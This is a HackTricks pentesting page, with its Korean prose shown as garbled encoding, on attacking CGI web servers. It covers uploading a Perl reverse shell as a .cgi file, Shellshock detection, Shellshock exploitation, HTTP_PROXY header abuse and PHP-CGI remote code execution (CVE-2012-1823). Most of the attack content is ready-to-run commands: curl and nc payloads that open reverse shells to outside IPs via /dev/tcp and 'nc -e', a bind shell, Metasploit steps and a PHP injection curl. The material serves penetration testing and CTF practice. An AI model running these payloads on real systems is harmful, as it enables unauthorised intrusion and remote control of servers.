{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# ì •ë³´

**CGI ìŠ¤í¬ë¦½íŠ¸ëŠ” perl ìŠ¤í¬ë¦½íŠ¸**ì´ë¯€ë¡œ, _**.cgi**_ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì„œë²„ë¥¼ ì¹¨í•´í•œ ê²½ìš° **perl ë¦¬ë²„ìŠ¤ ì…¸** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\)ì„ **ì—…ë¡œë“œ**í•˜ê³ , **í™•ì¥ìë¥¼** **.pl**ì—ì„œ **.cgi**ë¡œ ë³€ê²½í•œ í›„, **ì‹¤í–‰ ê¶Œí•œ** \(`chmod +x`\)ì„ ë¶€ì—¬í•˜ê³  **ì›¹ ë¸Œë¼ìš°ì €**ì—ì„œ ë¦¬ë²„ìŠ¤ ì…¸ì— **ì ‘ì†**í•˜ì—¬ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **CGI ì·¨ì•½ì **ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ `nikto -C all` \(ë° ëª¨ë“  í”ŒëŸ¬ê·¸ì¸\)ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤.

# **ShellShock**

**ShellShock**ëŠ” Unix ê¸°ë°˜ ìš´ì˜ ì²´ì œì—ì„œ ë„ë¦¬ ì‚¬ìš©ë˜ëŠ” **Bash** ëª…ë ¹ì¤„ ì…¸ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” **ì·¨ì•½ì **ì…ë‹ˆë‹¤. ì´ëŠ” Bashê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì˜í•´ ì „ë‹¬ëœ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ëŠ¥ë ¥ì„ ëª©í‘œë¡œ í•©ë‹ˆë‹¤. ì·¨ì•½ì ì€ **í™˜ê²½ ë³€ìˆ˜**ì˜ ì¡°ì‘ì— ìˆìœ¼ë©°, ì´ëŠ” ì»´í“¨í„°ì—ì„œ í”„ë¡œì„¸ìŠ¤ê°€ ì‹¤í–‰ë˜ëŠ” ë°©ì‹ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ë™ì  ì´ë¦„ ê°’ì…ë‹ˆë‹¤. ê³µê²©ìëŠ” í™˜ê²½ ë³€ìˆ˜ì— **ì•…ì„± ì½”ë“œ**ë¥¼ ì²¨ë¶€í•˜ì—¬ ë³€ìˆ˜ë¥¼ ìˆ˜ì‹ í•  ë•Œ ì‹¤í–‰ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì‹œìŠ¤í…œì„ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ **í˜ì´ì§€ì—ì„œ ì˜¤ë¥˜ê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ì´ ì·¨ì•½ì ì„ **ì°¾ì„ ìˆ˜ ìˆëŠ” ë°©ë²•**ì€ **êµ¬ì‹ Apache ë²„ì „**ê³¼ **cgi\_mod** \(cgi í´ë” í¬í•¨\)ì„ ì‚¬ìš©í•˜ê³  ìˆëŠ” ê²ƒì„ í™•ì¸í•˜ê±°ë‚˜ **nikto**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

## **í…ŒìŠ¤íŠ¸**

ëŒ€ë¶€ë¶„ì˜ í…ŒìŠ¤íŠ¸ëŠ” ë¬´ì–¸ê°€ë¥¼ ì—ì½”í•˜ê³  í•´ë‹¹ ë¬¸ìì—´ì´ ì›¹ ì‘ë‹µìœ¼ë¡œ ë°˜í™˜ë˜ê¸°ë¥¼ ê¸°ëŒ€í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ì§„í–‰ë©ë‹ˆë‹¤. í˜ì´ì§€ê°€ ì·¨ì•½í•  ìˆ˜ ìˆë‹¤ê³  ìƒê°ë˜ë©´ ëª¨ë“  cgi í˜ì´ì§€ë¥¼ ê²€ìƒ‰í•˜ê³  í…ŒìŠ¤íŠ¸í•˜ì‹­ì‹œì˜¤.

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(ë°˜ì‚¬, ë¸”ë¼ì¸ë“œ ë° ì•„ì›ƒ ì˜¤ë¸Œ ë°´ë“œ\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## ìµìŠ¤í”Œë¡œì‡
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **í”„ë¡ì‹œ \(MitMì—ì„œ ì›¹ ì„œë²„ ìš”ì²­ìœ¼ë¡œ\)**

CGIëŠ” http ìš”ì²­ì˜ ê° í—¤ë”ì— ëŒ€í•´ í™˜ê²½ ë³€ìˆ˜ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´: "host:web.com"ì€ "HTTP\_HOST"="web.com"ìœ¼ë¡œ ìƒì„±ë©ë‹ˆë‹¤.

HTTP\_PROXY ë³€ìˆ˜ê°€ ì›¹ ì„œë²„ì— ì˜í•´ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. "**Proxy: &lt;IP\_attacker&gt;:&lt;PORT&gt;**"ë¥¼ í¬í•¨í•˜ëŠ” **í—¤ë”**ë¥¼ ë³´ë‚´ê³ , ì„¸ì…˜ ì¤‘ì— ì„œë²„ê°€ ìš”ì²­ì„ ìˆ˜í–‰í•˜ëŠ” ê²½ìš°, ì„œë²„ê°€ ë§Œë“  ê° ìš”ì²­ì„ ìº¡ì²˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

# êµ¬í˜• PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

ê¸°ë³¸ì ìœ¼ë¡œ cgiê°€ í™œì„±í™”ë˜ê³  phpê°€ "êµ¬í˜•" \(&lt;5.3.12 / &lt; 5.4.2\)ì¸ ê²½ìš° ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ë§¤ê°œë³€ìˆ˜ë¥¼ ë³´ë‚´ì§€ ì•Šê³  \(íŠ¹íˆ "=" ë¬¸ìë¥¼ ë³´ë‚´ì§€ ì•Šê³ \) ì›¹ ì„œë²„ì˜ ì¼ë¶€ PHP íŒŒì¼ì— ì ‘ê·¼í•´ì•¼ í•©ë‹ˆë‹¤.
ê·¸ëŸ° ë‹¤ìŒ ì´ ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ì˜ˆë¥¼ ë“¤ì–´ `/index.php?-s`ì— ì ‘ê·¼í•  ìˆ˜ ìˆìœ¼ë©° \(note the `-s`\) **ì‘ë‹µì— ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì†ŒìŠ¤ ì½”ë“œê°€ ë‚˜íƒ€ë‚©ë‹ˆë‹¤**.

ê·¸ëŸ° ë‹¤ìŒ **RCE**ë¥¼ ì–»ê¸° ìœ„í•´ ì´ íŠ¹ë³„í•œ ì¿¼ë¦¬ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` ë° **ìš”ì²­ ë³¸ë¬¸ì—ì„œ ì‹¤í–‰ë  PHP ì½”ë“œ**.
ì˜ˆ:**
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**ì·¨ì•½ì  ë° ê°€ëŠ¥í•œ ìµìŠ¤í”Œë¡œì‡ì— ëŒ€í•œ ì¶”ê°€ ì •ë³´:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF ì‘ì„± ì˜ˆì‹œ**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**



{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
